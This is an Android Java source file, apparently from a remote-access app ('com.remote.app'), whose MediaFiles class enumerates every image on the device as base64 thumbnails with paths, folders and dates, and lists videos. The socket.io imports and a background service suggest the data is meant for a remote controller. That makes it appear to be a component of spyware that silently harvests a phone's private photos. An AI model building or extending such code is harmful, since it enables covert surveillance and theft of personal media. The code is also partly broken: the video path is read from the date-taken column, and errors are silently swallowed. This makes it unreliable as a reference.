package com.remote.app.Managers;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ThumbnailUtils;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import com.remote.app.MainService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import io.socket.client.Socket;
import io.socket.emitter.Emitter;


public class MediaFiles{

    public static JSONObject getImagesList() {
        Context ctx;
        ctx = MainService.getContextOfApplication();
        JSONObject photo = new JSONObject();
        JSONArray photos = new JSONArray();


        Cursor cur = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.ImageColumns.DATE_MODIFIED);
        while(cur.moveToNext()) {
            String path = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DATA));
            String bucket = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME));
            String date = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DATE_MODIFIED));
            String name = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DISPLAY_NAME));
            try{
                photo.put(base.MediaFiles.DISPLAY_NAME,name);
                photo.put(base.MediaFiles.BUCKET,bucket);
                photo.put(base.MediaFiles.DATE,date);
                photo.put(base.MediaFiles.PATH,path);
                photo.put(base.MediaFiles.DATA,encodeImage(getThumb(path)));
                photos.put(photo);
                photo = new JSONObject();

            }catch (Exception e){}
        }

        if (cur != null) {
            cur.close();
        }
        try{
        photo.put(base.MediaFiles.PHOTOS,photos);

        }
        catch (Exception e){}
        return photo;
    }

    private static Bitmap getThumb(String path) {
        return ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(path), MainService.prefs.getInt("MFWidth",128), MainService.prefs.getInt("MFHeight",128));
    }

    private static String encodeImage(Bitmap bm) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        bm.compress(Bitmap.CompressFormat.PNG, 100, (OutputStream)baos);

        byte[] b = baos.toByteArray();

        String var10000 = Base64.encodeToString(b, Base64.DEFAULT);

        return var10000;
    }

    public static JSONObject getVideosList() {
        Context ctx;
        ctx = MainService.getContextOfApplication();
        JSONObject video = new JSONObject();
        JSONArray videos = new JSONArray();


        Cursor cur = ctx.getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Video.VideoColumns.DATE_MODIFIED);
        while(cur.moveToNext()) {
            String path = cur.getString(cur.getColumnIndex(MediaStore.Video.VideoColumns.DATE_TAKEN));
            String bucket = cur.getString(cur.getColumnIndex(MediaStore.Video.VideoColumns.BUCKET_DISPLAY_NAME));
            String date = cur.getString(cur.getColumnIndex(MediaStore.Video.VideoColumns.DATE_MODIFIED));
            String name = cur.getString(cur.getColumnIndex(MediaStore.Video.VideoColumns.DISPLAY_NAME));
            try{
                video.put("name",name);
                video.put("bucket",bucket);
                video.put("date",date);
                video.put("path",path);
                videos.put(video);
                video = new JSONObject();

            }catch (Exception e){}
        }

        if (cur != null) {
            cur.close();
        }
        try{
            video.put("videos",videos);

        }
        catch (Exception e){}
        return video;
    }

}